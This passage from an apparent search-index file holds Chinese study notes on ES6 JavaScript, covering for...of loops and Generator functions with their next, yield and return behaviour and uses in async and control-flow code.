<p>3\u3001<code>for...in</code>\u5faa\u73af\u53ef\u4ee5\u904d\u5386\u6570\u7ec4\u7684\u952e\u540d\u3002</p> <pre><code>for (var index in myArray) {\n  console.log(myArray[index]);\n}\n</code></pre> <p><code>for...in</code>\u5faa\u73af\u6709\u51e0\u4e2a\u7f3a\u70b9\u3002</p> <ul> <li>\u6570\u7ec4\u7684\u952e\u540d\u662f\u6570\u5b57\uff0c\u4f46\u662f<code>for...in</code>\u5faa\u73af\u662f\u4ee5\u5b57\u7b26\u4e32\u4f5c\u4e3a\u952e\u540d\u201c0\u201d\u3001\u201c1\u201d\u3001\u201c2\u201d\u7b49\u7b49\u3002</li> <li><code>for...in</code>\u5faa\u73af\u4e0d\u4ec5\u904d\u5386\u6570\u5b57\u952e\u540d\uff0c\u8fd8\u4f1a\u904d\u5386\u624b\u52a8\u6dfb\u52a0\u7684\u5176\u4ed6\u952e\uff0c\u751a\u81f3\u5305\u62ec\u539f\u578b\u94fe\u4e0a\u7684\u952e\u3002</li> <li>\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c<code>for...in</code>\u5faa\u73af\u4f1a\u4ee5\u4efb\u610f\u987a\u5e8f\u904d\u5386\u952e\u540d\u3002</li> </ul> <p>\u603b\u4e4b==\uff0c<code>for...in</code>\u5faa\u73af\u4e3b\u8981\u662f\u4e3a\u904d\u5386\u5bf9\u8c61\u800c\u8bbe\u8ba1\u7684\uff0c\u4e0d\u9002\u7528\u4e8e\u904d\u5386\u6570\u7ec4==\u3002</p> <p>4\u3001<code>for...of</code>\u5faa\u73af\u76f8\u6bd4\u4e0a\u9762\u51e0\u79cd\u505a\u6cd5\uff0c\u6709\u4e00\u4e9b\u663e\u8457\u7684\u4f18\u70b9\u3002</p> <pre><code>for (let value of myArray) {\n  console.log(value);\n}\n</code></pre> <ul> <li>\u6709\u7740\u540c<code>for...in</code>\u4e00\u6837\u7684\u7b80\u6d01\u8bed\u6cd5\uff0c\u4f46\u662f\u6ca1\u6709<code>for...in</code>\u90a3\u4e9b\u7f3a\u70b9\u3002</li> <li>\u4e0d\u540c\u4e8e<code>forEach</code>\u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u4e0e<code>break</code>\u3001<code>continue</code>\u548c<code>return</code>\u914d\u5408\u4f7f\u7528\u3002</li> <li>\u63d0\u4f9b\u4e86\u904d\u5386\u6240\u6709\u6570\u636e\u7ed3\u6784\u7684\u7edf\u4e00\u64cd\u4f5c\u63a5\u53e3\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f7f\u7528 break \u8bed\u53e5\uff0c\u8df3\u51fa<code>for...of</code>\u5faa\u73af\u7684\u4f8b\u5b50\u3002</p> <pre><code>for (var n of fibonacci) {\n  if (n &gt; 1000)\n    break;\n  console.log(n);\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/18-Generator/","title":"18-Generator","text":""},{"location":"ebook-JSES6-RYF/18-Generator/#generator","title":"Generator \u51fd\u6570","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 11750  \u9605\u8bfb24\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/18-Generator/#_1","title":"\u4ecb\u7ecd","text":""},{"location":"ebook-JSES6-RYF/18-Generator/#_2","title":"\u4f5c\u7528","text":"<ul> <li>\u5b9e\u73b0\u51fd\u6570\u7684\u5f02\u6b65\u7f16\u7a0b</li> <li>\u662f\u4e00\u4e2a\u72b6\u6001\u673a\uff08\u4fdd\u5b58\u5e76\u8f93\u51fa\u4e86\u4e00\u4e9b\u72b6\u6001 yield\uff09</li> <li>\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff08\u53ef\u4ee5\u904d\u5386\u8f93\u51fa\u7684\u72b6\u6001\uff09</li> <li>\u7279\u70b9\uff1afucntion \u52a0 *, \u4f7f\u7528 yield \u8f93\u51fa\u72b6\u6001\uff08\u901a\u5e38function\u540e\u76f4\u63a5\u52a0\u661f\u53f7\uff0c\u5982\u679c\u6709\u7a7a\u683c\u4e0d\u4f1a\u62a5\u9519\uff09</li> </ul>"},{"location":"ebook-JSES6-RYF/18-Generator/#_3","title":"\u4f7f\u7528","text":"<pre><code>function* hello() {\n  yield 'hello';\n  yield 'world';\n  return 'end';\n  // \u51fd\u6570\u5185\u90e8\u4fdd\u5b58\u4e09\u4e2a\u72b6\u6001\n}\nlet test = hello();\n// \u8c03\u7528\u51fd\u6570\u540e\uff0c\u51fd\u6570\u4e0d\u6267\u884c\uff0c\u8fd4\u56de\u7684\u4e0d\u662f\u8fd0\u884c\u7ed3\u679c\uff0c\u800c\u662f\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff08\u6307\u5411\u5185\u90e8\u72b6\u6001\u7684\u6307\u9488\u5bf9\u8c61\uff09\n\ntest.next(); {value: \"hello\", done: false} // \u8c03\u7528generator\u7684next\u65b9\u6cd5\uff0c\u4f9d\u6b21\u83b7\u53d6\u751f\u6210\u51fd\u6570\u7684\u6bcf\u4e00\u4e2a\u72b6\u6001(\u7b2c\u4e00\u6b21\u8fd4\u56de\u7b2c\u4e00\u4e2ayield\u5bf9\u5e94\u7684\u72b6\u6001\uff0cdone: false \u8868\u793a\u8fd8\u6ca1\u6709\u6267\u884c\u5b8c) \u8fd4\u56de\u503c\u662fyield\u7684\u72b6\u6001\uff0c\u51fd\u6570\u6682\u505c\u6267\u884c\ntest.next(); {value: \"world\", done: false}\ntest.next(); {value: \"end\", done: true} //\u6267\u884c\u7b2c\u4e09\u6b21\uff0c\u6ca1\u6709yield\uff0c\u5c31\u6267\u884c\u5230return\u6216\u8005\u51fd\u6570\u8bed\u53e5 done:true \u8868\u793a\u6267\u884c\u7ed3\u675f\ntest.next(); {value: undefined, done: true} // \u5982\u679c\u7ee7\u7eed\u6267\u884c\uff0c\u83b7\u53d6\u7684\u503c\u662fundefined\n</code></pre> <p>\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5185\u90e8\u72b6\u6001\u7684\u6307\u9488\uff1a\u6bcf\u8c03\u7528\u4e00\u6b21next\u65b9\u6cd5\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61 {value: yield, done:false} \u83b7\u53d6\u5f53\u524d\u7684\u72b6\u6001\u548c\u662f\u5426\u904d\u5386\u7ed3\u675f\u3002yield \u540e\u9762\u7684\u4ee3\u7801\uff0c\u5f53next\u6267\u884c\u540e\uff0c\u6307\u9488\u79fb\u52a8\u5230\u8fd9\u91cc\uff0c\u624d\u4f1a\u6267\u884c\u5e76\u6c42\u503c\u3002\u5b9e\u9645\u4e0a\uff0cyield \u7c7b\u4f3c\u4e8e pause\uff0c\u8868\u793a\u6682\u505c\u6267\u884c\u5e76\u8fd4\u56de\u4e00\u4e2a\u503c\u3002</p>"},{"location":"ebook-JSES6-RYF/18-Generator/#_4","title":"\u6682\u7f13\u6267\u884c\u51fd\u6570","text":"<pre><code>function* sleep() {\n  console.log('test');\n}\n\nlet genarator = sleep();\nsetTimeout(() =&gt; {\n  genarator.next();\n}, 1000)\n</code></pre> <p>\u5982\u679c\u4e0d\u4f7f\u7528yield\uff0c\u76f4\u63a5\u653e\u5728\u5b9a\u65f6\u5668\u51fd\u6570\u4e2d\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u6682\u7f13\u6267\u884c\u51fd\u6570\uff1b\u5982\u679c\u8bbe\u7f6e\u591a\u4e2a\u5b9a\u65f6\u5668\uff0c\u90a3\u4e48\u53ef\u4ee5\u6267\u884c\u591a\u4e2a\u6b65\u9aa4\uff08\u4f8b\u5982\u7b80\u5355\u52a8\u753b\uff09\u3002yield\u8bed\u53e5\u53ea\u80fd\u7528\u5728\u751f\u6210\u5668\u51fd\u6570\u4e2d\u3002</p> <pre><code>let flat = function* (arr) {\n  for (let i = 0; i &lt; arr.length; i++) {\n    let item = arr[i];\n    if (typeof item !== 'number') {\n      yield* flat(item); // \u9012\u5f52\u5904\u7406\u5d4c\u5957\u7684\u6570\u7ec4\n    } else {\n      yield item;\n    }\n  }\n};\nlet arr = [1, 2, [3, 4]];\nlet genarator = flat(arr);\nfor (let item of genarator) {\n  console.log(item);\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/18-Generator/#next","title":"next","text":"<p>next \u9ed8\u8ba4\u4e0d\u5e26\u53c2\u6570\uff0c\u76f4\u63a5\u8fd4\u56de\u4e0b\u4e00\u4e2ayield\u540e\u9762\u7684\u8fd4\u56de\u503c\uff1b\u5982\u679c\u5e26\u53c2\u6570\uff0c\u90a3\u4e48\u53c2\u6570\u5c31\u662f\u4e0a\u4e00\u4e2a yield \u8868\u8fbe\u5f0f\u7684\u8fd4\u56de\u503c\u3002</p> <pre><code>function* foo(x) {\n  var y = 2 * (yield (x + 1));\n  var z = yield (y / 3);\n  return (x + y + z);\n}\n\nvar a = foo(5);\na.next() // Object{value:6, done:false}\na.next() // Object{value:NaN, done:false} \u7b2c\u4e8c\u6b21\u8fd0\u884c\u65f6\uff0cy = 2 * yield = 2 * undefined = undefined \na.next() // Object{value:NaN, done:true} \u7b2c\u4e09\u6b21\u8fd0\u884c\u65f6\uff0cz = yield = undefined, return NaN\n\nvar b = foo(5); // \u53c2\u6570\u662f5\nb.next() // { value:6, done:false } 5 + 1 = 6 \u8fd4\u56de6 \nb.next(12) // { value:8, done:false } y = 2 * 12 = 24, yield (y/3) = 8, \u8fd4\u56de8\nb.next(13) // { value:42, done:true } z = 13, return 5 + 24 + 13 = 42, \u8fd4\u56de42\n</code></pre>"},{"location":"ebook-JSES6-RYF/18-Generator/#forof","title":"for...of","text":"<p>\u4f7f\u7528 for...of \u53ef\u4ee5\u76f4\u63a5\u904d\u5386\u8fd4\u56de\u503c\uff08\u8fd4\u56de\u7684\u904d\u5386\u5668\uff09\uff0c\u4f9d\u6b21\u83b7\u53d6yield\u7684\u72b6\u6001\uff0c\u4f46\u662f\u4e0d\u4f1a\u83b7\u53d6return\u7684\u72b6\u6001\u3002</p> <pre><code>function* fibonacci() {\n  let [pre, current] = [0, 1];\n  for (;;) {\n    yield current;\n    [pre, current] = [current, pre + current];\n  }\n}\n\nfor (let n of fibonacci()) {\n  if (n &gt; 1000) break;\n  console.log(n);\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/18-Generator/#_5","title":"\u89e3\u6784\u8d4b\u503c","text":"<pre><code>function* numbers () {\n  yield 1\n  yield 2\n  return 3\n  yield 4\n}\n\n// \u6269\u5c55\u8fd0\u7b97\u7b26\n[...numbers()] // [1, 2]\n\n// Array.from \u65b9\u6cd5\nArray.from(numbers()) // [1, 2]\n\n// \u89e3\u6784\u8d4b\u503c\nlet [x, y] = numbers();\nx // 1\ny // 2\n\n// for...of \u5faa\u73af\nfor (let n of numbers()) {\n  console.log(n)\n}\n// 1\n// 2\n</code></pre>"},{"location":"ebook-JSES6-RYF/18-Generator/#return","title":"return","text":"<p>Generator \u51fd\u6570\u8fd4\u56de\u7684\u904d\u5386\u5668\u5bf9\u8c61\uff0creturn\uff0c\u53ef\u4ee5\u8fd4\u56de\u7ed9\u5b9a\u7684\u503c\uff0c\u5e76\u4e14\u7ec8\u7ed3\u904d\u5386 Generator \u51fd\u6570\u3002</p> <pre><code>g.return('foo') // { value: \"foo\", done: true }\ng.next() {value: undefined, done: true}\n\n// \u5982\u679creturn\u6ca1\u6709\u53c2\u6570\uff0c\u90a3\u4e48\u8fd4\u56de\u7684value\u662fundefined\n</code></pre>"},{"location":"ebook-JSES6-RYF/18-Generator/#_6","title":"\u9ad8\u7ea7\u5e94\u7528","text":"<p>Generator \u53ef\u4ee5\u6682\u505c\u51fd\u6570\u6267\u884c\uff0c\u8fd4\u56de\u4efb\u610f\u8868\u8fbe\u5f0f\u7684\u503c\u3002</p>"},{"location":"ebook-JSES6-RYF/18-Generator/#1","title":"\uff081\uff09\u5f02\u6b65\u64cd\u4f5c\u7684\u540c\u6b65\u5316\u8868\u8fbe","text":"<p>Generator \u51fd\u6570\u7684\u6682\u505c\u6267\u884c\u7684\u6548\u679c\uff0c\u610f\u5473\u7740\u53ef\u4ee5\u628a\u5f02\u6b65\u64cd\u4f5c\u5199\u5728<code>yield</code>\u8868\u8fbe\u5f0f\u91cc\u9762\uff0c\u7b49\u5230\u8c03\u7528<code>next</code>\u65b9\u6cd5\u65f6\u518d\u5f80\u540e\u6267\u884c\u3002\u8fd9\u5b9e\u9645\u4e0a\u7b49\u540c\u4e8e\u4e0d\u9700\u8981\u5199\u56de\u8c03\u51fd\u6570\u4e86\uff0c\u56e0\u4e3a\u5f02\u6b65\u64cd\u4f5c\u7684\u540e\u7eed\u64cd\u4f5c\u53ef\u4ee5\u653e\u5728<code>yield</code>\u8868\u8fbe\u5f0f\u4e0b\u9762\uff0c\u53cd\u6b63\u8981\u7b49\u5230\u8c03\u7528<code>next</code>\u65b9\u6cd5\u65f6\u518d\u6267\u884c\u3002\u6240\u4ee5\uff0cGenerator \u51fd\u6570\u7684\u4e00\u4e2a\u91cd\u8981\u5b9e\u9645\u610f\u4e49\u5c31\u662f\u7528\u6765\u5904\u7406\u5f02\u6b65\u64cd\u4f5c\uff0c\u6539\u5199\u56de\u8c03\u51fd\u6570\u3002</p> <pre><code>function* loadUI() {\n  showLoadingScreen();\n  yield loadUIDataAsynchronously();\n  hideLoadingScreen();\n}\nvar loader = loadUI();\n// \u52a0\u8f7dUI\nloader.next()\n// \u5378\u8f7dUI\nloader.next()\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u6b21\u8c03\u7528<code>loadUI</code>\u51fd\u6570\u65f6\uff0c\u8be5\u51fd\u6570\u4e0d\u4f1a\u6267\u884c\uff0c\u4ec5\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u3002\u4e0b\u4e00\u6b21\u5bf9\u8be5\u904d\u5386\u5668\u8c03\u7528<code>next</code>\u65b9\u6cd5\uff0c\u5219\u4f1a\u663e\u793a<code>Loading</code>\u754c\u9762\uff08<code>showLoadingScreen</code>\uff09\uff0c\u5e76\u4e14\u5f02\u6b65\u52a0\u8f7d\u6570\u636e\uff08<code>loadUIDataAsynchronously</code>\uff09\u3002\u7b49\u5230\u6570\u636e\u52a0\u8f7d\u5b8c\u6210\uff0c\u518d\u4e00\u6b21\u4f7f\u7528<code>next</code>\u65b9\u6cd5\uff0c\u5219\u4f1a\u9690\u85cf<code>Loading</code>\u754c\u9762\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u79cd\u5199\u6cd5\u7684\u597d\u5904\u662f\u6240\u6709<code>Loading</code>\u754c\u9762\u7684\u903b\u8f91\uff0c\u90fd\u88ab\u5c01\u88c5\u5728\u4e00\u4e2a\u51fd\u6570\uff0c\u6309\u90e8\u5c31\u73ed\u975e\u5e38\u6e05\u6670\u3002</p> <p>Ajax \u662f\u5178\u578b\u7684\u5f02\u6b65\u64cd\u4f5c\uff0c\u901a\u8fc7 Generator \u51fd\u6570\u90e8\u7f72 Ajax \u64cd\u4f5c\uff0c\u53ef\u4ee5\u7528\u540c\u6b65\u7684\u65b9\u5f0f\u8868\u8fbe\u3002</p> <pre><code>function* main() {\n  var result = yield request(\"http://some.url\");\n  var resp = JSON.parse(result);\n    console.log(resp.value);\n}\n\nfunction request(url) {\n  makeAjaxCall(url, function(response){\n    it.next(response); // \u8fd9\u91cc\u7684response\u4f5c\u4e3a\u4e0a\u4e00\u6b21yield\u7684\u503c\uff08result = yield\uff09\n  });\n}\n\nvar it = main();\nit.next();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>main</code>\u51fd\u6570\uff0c\u5c31\u662f\u901a\u8fc7 Ajax \u64cd\u4f5c\u83b7\u53d6\u6570\u636e\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u9664\u4e86\u591a\u4e86\u4e00\u4e2a<code>yield</code>\uff0c\u5b83\u51e0\u4e4e\u4e0e\u540c\u6b65\u64cd\u4f5c\u7684\u5199\u6cd5\u5b8c\u5168\u4e00\u6837\u3002\u6ce8\u610f\uff0c<code>makeAjaxCall</code>\u51fd\u6570\u4e2d\u7684<code>next</code>\u65b9\u6cd5\uff0c\u5fc5\u987b\u52a0\u4e0a<code>response</code>\u53c2\u6570\uff0c\u56e0\u4e3a<code>yield</code>\u8868\u8fbe\u5f0f\uff0c\u672c\u8eab\u662f\u6ca1\u6709\u503c\u7684\uff0c\u603b\u662f\u7b49\u4e8e<code>undefined</code>\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff0c\u901a\u8fc7 Generator \u51fd\u6570\u9010\u884c\u8bfb\u53d6\u6587\u672c\u6587\u4ef6\u3002</p> <pre><code>function* numbers() {\n  let file = new FileReader(\"numbers.txt\");\n  try {\n    while(!file.eof) {\n      yield parseInt(file.readLine(), 10);\n    }\n  } finally {\n    file.close();\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6253\u5f00\u6587\u672c\u6587\u4ef6\uff0c\u4f7f\u7528<code>yield</code>\u8868\u8fbe\u5f0f\u53ef\u4ee5\u624b\u52a8\u9010\u884c\u8bfb\u53d6\u6587\u4ef6\u3002</p>"},{"location":"ebook-JSES6-RYF/18-Generator/#2","title":"\uff082\uff09\u63a7\u5236\u6d41\u7ba1\u7406","text":"<p>\u5982\u679c\u6709\u4e00\u4e2a\u591a\u6b65\u64cd\u4f5c\u975e\u5e38\u8017\u65f6\uff0c\u91c7\u7528\u56de\u8c03\u51fd\u6570\uff0c\u53ef\u80fd\u4f1a\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002</p> <pre><code>step1(function (value1) {\n  step2(value1, function(value2) {\n    step3(value2, function(value3) {\n      step4(value3, function(value4) {\n        // Do something with value4\n      });\n    });\n  });\n});\n</code></pre> <p>\u91c7\u7528 Promise \u6539\u5199\u4e0a\u9762\u7684\u4ee3\u7801\u3002</p> <pre><code>Promise.resolve(step1)\n  .then(step2)\n  .then(step3)\n  .then(step4)\n  .then(function (value4) {\n    // Do something with value4\n  }, function (error) {\n    // Handle any error from step1 through step4\n  })\n  .done();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5df2\u7ecf\u628a\u56de\u8c03\u51fd\u6570\uff0c\u6539\u6210\u4e86\u76f4\u7ebf\u6267\u884c\u7684\u5f62\u5f0f\uff0c\u4f46\u662f\u52a0\u5165\u4e86\u5927\u91cf Promise \u7684\u8bed\u6cd5\u3002Generator \u51fd\u6570\u53ef\u4ee5\u8fdb\u4e00\u6b65\u6539\u5584\u4ee3\u7801\u8fd0\u884c\u6d41\u7a0b\u3002</p> <pre><code>function* longRunningTask(value1) {\n  try {\n    var value2 = yield step1(value1);\n    var value3 = yield step2(value2);\n    var value4 = yield step3(value3);\n    var value5 = yield step4(value4);\n    // Do something with value4\n  } catch (e) {\n    // Handle any error from step1 through step4\n  }\n}\n</code></pre> <p>\u7136\u540e\uff0c\u4f7f\u7528\u4e00\u4e2a\u51fd\u6570\uff0c\u6309\u6b21\u5e8f\u81ea\u52a8\u6267\u884c\u6240\u6709\u6b65\u9aa4\u3002</p> <pre><code>scheduler(longRunningTask(initialValue));\n\nfunction scheduler(task) {\n  var taskObj = task.next(task.value);\n  // \u5982\u679cGenerator\u51fd\u6570\u672a\u7ed3\u675f\uff0c\u5c31\u7ee7\u7eed\u8c03\u7528\n  if (!taskObj.done) {\n    task.value = taskObj.value\n    scheduler(task);\n  }\n}\n</code></pre> <p>\u6ce8\u610f\uff0c\u4e0a\u9762\u8fd9\u79cd\u505a\u6cd5\uff0c\u53ea\u9002\u5408\u540c\u6b65\u64cd\u4f5c\uff0c\u5373\u6240\u6709\u7684<code>task</code>\u90fd\u5fc5\u987b\u662f\u540c\u6b65\u7684\uff0c\u4e0d\u80fd\u6709\u5f02\u6b65\u64cd\u4f5c\u3002\u56e0\u4e3a\u8fd9\u91cc\u7684\u4ee3\u7801\u4e00\u5f97\u5230\u8fd4\u56de\u503c\uff0c\u5c31\u7ee7\u7eed\u5f80\u4e0b\u6267\u884c\uff0c\u6ca1\u6709\u5224\u65ad\u5f02\u6b65\u64cd\u4f5c\u4f55\u65f6\u5b8c\u6210\u3002\u5982\u679c\u8981\u63a7\u5236\u5f02\u6b65\u7684\u64cd\u4f5c\u6d41\u7a0b\uff0c\u8be6\u89c1\u540e\u9762\u7684\u300a\u5f02\u6b65\u64cd\u4f5c\u300b\u4e00\u7ae0\u3002</p> <p>\u4e0b\u9762\uff0c\u5229\u7528<code>for...of</code>\u5faa\u73af\u4f1a\u81ea\u52a8\u4f9d\u6b21\u6267\u884c<code>yield</code>\u547d\u4ee4\u7684\u7279\u6027\uff0c\u63d0\u4f9b\u4e00\u79cd\u66f4\u4e00\u822c\u7684\u63a7\u5236\u6d41\u7ba1\u7406\u7684\u65b9\u6cd5\u3002</p> <pre><code>let steps = [step1Func, step2Func, step3Func];\n\nfunction* iterateSteps(steps){\n  for (var i=0; i&lt; steps.length; i++){\n    var step = steps[i];\n    yield step();\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4<code>steps</code>\u5c01\u88c5\u4e86\u4e00\u4e2a\u4efb\u52a1\u7684\u591a\u4e2a\u6b65\u9aa4\uff0cGenerator \u51fd\u6570<code>iterateSteps</code>\u5219\u662f\u4f9d\u6b21\u4e3a\u8fd9\u4e9b\u6b65\u9aa4\u52a0\u4e0a<code>yield</code>\u547d\u4ee4\u3002</p> <p>\u5c06\u4efb\u52a1\u5206\u89e3\u6210\u6b65\u9aa4\u4e4b\u540e\uff0c\u8fd8\u53ef\u4ee5\u5c06\u9879\u76ee\u5206\u89e3\u6210\u591a\u4e2a\u4f9d\u6b21\u6267\u884c\u7684\u4efb\u52a1\u3002</p> <pre><code>let jobs = [job1, job2, job3];\n\nfunction* iterateJobs(jobs){\n  for (var i=0; i&lt; jobs.length; i++){\n    var job = jobs[i];\n    yield* iterateSteps(job.steps);\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4<code>jobs</code>\u5c01\u88c5\u4e86\u4e00\u4e2a\u9879\u76ee\u7684\u591a\u4e2a\u4efb\u52a1\uff0cGenerator \u51fd\u6570<code>iterateJobs</code>\u5219\u662f\u4f9d\u6b21\u4e3a\u8fd9\u4e9b\u4efb\u52a1\u52a0\u4e0a<code>yield*</code>\u547d\u4ee4\u3002</p> <p>\u6700\u540e\uff0c\u5c31\u53ef\u4ee5\u7528<code>for...of</code>\u5faa\u73af\u4e00\u6b21\u6027\u4f9d\u6b21\u6267\u884c\u6240\u6709\u4efb\u52a1\u7684\u6240\u6709\u6b65\u9aa4\u3002</p> <pre><code>for (var step of iterateJobs(jobs)){\n  console.log(step.id);\n}\n</code></pre> <p>\u518d\u6b21\u63d0\u9192\uff0c\u4e0a\u9762\u7684\u505a\u6cd5\u53ea\u80fd\u7528\u4e8e\u6240\u6709\u6b65\u9aa4\u90fd\u662f\u540c\u6b65\u64cd\u4f5c\u7684\u60c5\u51b5\uff0c\u4e0d\u80fd\u6709\u5f02\u6b65\u64cd\u4f5c\u7684\u6b65\u9aa4\u3002\u5982\u679c\u60f3\u8981\u4f9d\u6b21\u6267\u884c\u5f02\u6b65\u7684\u6b65\u9aa4\uff0c\u5fc5\u987b\u4f7f\u7528\u540e\u9762\u7684\u300a\u5f02\u6b65\u64cd\u4f5c\u300b\u4e00\u7ae0\u4ecb\u7ecd\u7684\u65b9\u6cd5\u3002</p> <p><code>for...of</code>\u7684\u672c\u8d28\u662f\u4e00\u4e2a<code>while</code>\u5faa\u73af\uff0c\u6240\u4ee5\u4e0a\u9762\u7684\u4ee3\u7801\u5b9e\u8d28\u4e0a\u6267\u884c\u7684\u662f\u4e0b\u9762\u7684\u903b\u8f91\u3002</p> <pre><code>var it = iterateJobs(jobs);\nvar res = it.next();\n\nwhile (!res.done){\n  var result = res.value;\n  // ...\n  res = it.next();\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/18-Generator/#3-iterator","title":"\uff083\uff09\u90e8\u7f72 Iterator \u63a5\u53e3","text":"<p>\u5229\u7528 Generator \u51fd\u6570\uff0c\u53ef\u4ee5\u5728\u4efb\u610f\u5bf9\u8c61\u4e0a\u90e8\u7f72 Iterator \u63a5\u53e3\u3002</p> <pre><code>function* iterEntries(obj) {\n  let keys = Object.keys(obj);\n  for (let i=0; i &lt; keys.length; i++) {\n    let key = keys[i];\n    yield [key, obj[key]];\n  }\n}\n\nlet myObj = { foo: 3, bar: 7 };\n\nfor (let [key, value] of iterEntries(myObj)) {\n  console.log(key, value);\n}\n\n// foo 3\n// bar 7\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c<code>myObj</code>\u662f\u4e00\u4e2a\u666e\u901a\u5bf9\u8c61\uff0c\u901a\u8fc7<code>iterEntries</code>\u51fd\u6570\uff0c\u5c31\u6709\u4e86 Iterator \u63a5\u53e3\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ef\u4ee5\u5728\u4efb\u610f\u5bf9\u8c61\u4e0a\u90e8\u7f72<code>next</code>\u65b9\u6cd5\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u5bf9\u6570\u7ec4\u90e8\u7f72 Iterator \u63a5\u53e3\u7684\u4f8b\u5b50\uff0c\u5c3d\u7ba1\u6570\u7ec4\u539f\u751f\u5177\u6709\u8fd9\u4e2a\u63a5\u53e3\u3002</p> <pre><code>function* makeSimpleGenerator(array){\n  var nextIndex = 0;\n\n  while(nextIndex &lt; array.length){\n    yield array[nextIndex++];\n  }\n}\n\nvar gen = makeSimpleGenerator(['yo', 'ya']);\n\ngen.next().value // 'yo'\ngen.next().value // 'ya'\ngen.next().done  // true\n</code></pre>"},{"location":"ebook-JSES6-RYF/18-Generator/#4","title":"\uff084\uff09\u4f5c\u4e3a\u6570\u636e\u7ed3\u6784","text":"<p>Generator \u53ef\u4ee5\u770b\u4f5c\u662f\u6570\u636e\u7ed3\u6784\uff0c\u66f4\u786e\u5207\u5730\u8bf4\uff0c\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u6570\u7ec4\u7ed3\u6784\uff0c\u56e0\u4e3a Generator \u51fd\u6570\u53ef\u4ee5\u8fd4\u56de\u4e00\u7cfb\u5217\u7684\u503c\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u53ef\u4ee5\u5bf9\u4efb\u610f\u8868\u8fbe\u5f0f\uff0c\u63d0\u4f9b\u7c7b\u4f3c\u6570\u7ec4\u7684\u63a5\u53e3\u3002</p> <pre><code>function* doStuff() {\n  yield fs.readFile.bind(null, 'hello.txt');\n  yield fs.readFile.bind(null, 'world.txt');\n  yield fs.readFile.bind(null, 'and-such.txt');\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5c31\u662f\u4f9d\u6b21\u8fd4\u56de\u4e09\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u7531\u4e8e\u4f7f\u7528\u4e86 Generator \u51fd\u6570\uff0c\u5bfc\u81f4\u53ef\u4ee5\u50cf\u5904\u7406\u6570\u7ec4\u90a3\u6837\uff0c\u5904\u7406\u8fd9\u4e09\u4e2a\u8fd4\u56de\u7684\u51fd\u6570\u3002</p> <pre><code>for (task of doStuff()) {\n  // task\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u50cf\u56de\u8c03\u51fd\u6570\u90a3\u6837\u4f7f\u7528\u5b83\n}\n</code></pre> <p>\u5b9e\u9645\u4e0a\uff0c\u5982\u679c\u7528 ES5 \u8868\u8fbe\uff0c\u5b8c\u5168\u53ef\u4ee5\u7528\u6570\u7ec4\u6a21\u62df Generator \u7684\u8fd9\u79cd\u7528\u6cd5\u3002</p> <pre><code>function doStuff() {\n  return [\n    fs.readFile.bind(null, 'hello.txt'),\n    fs.readFile.bind(null, 'world.txt'),\n    fs.readFile.bind(null, 'and-such.txt')\n  ];\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u4e00\u6a21\u4e00\u6837\u7684<code>for...of</code>\u5faa\u73af\u5904\u7406\uff01\u4e24\u76f8\u4e00\u6bd4\u8f83\uff0c\u5c31\u4e0d\u96be\u770b\u51fa Generator \u4f7f\u5f97\u6570\u636e\u6216\u8005\u64cd\u4f5c\uff0c\u5177\u5907\u4e86\u7c7b\u4f3c\u6570\u7ec4\u7684\u63a5\u53e3\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/","title":"Generator \u51fd\u6570\u7684\u5f02\u6b65\u5e94\u7528","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 23942  \u9605\u8bfb48\u5206\u949f</p> <p>\u672c\u7ae0\u4e3b\u8981\u4ecb\u7ecd Generator \u51fd\u6570\u5982\u4f55\u5b8c\u6210\u5f02\u6b65\u64cd\u4f5c\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#1","title":"1\u3001\u57fa\u672c\u6982\u5ff5","text":""},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#_1","title":"\u5f02\u6b65\u7f16\u7a0b\u65b9\u6cd5","text":"<p>ES6 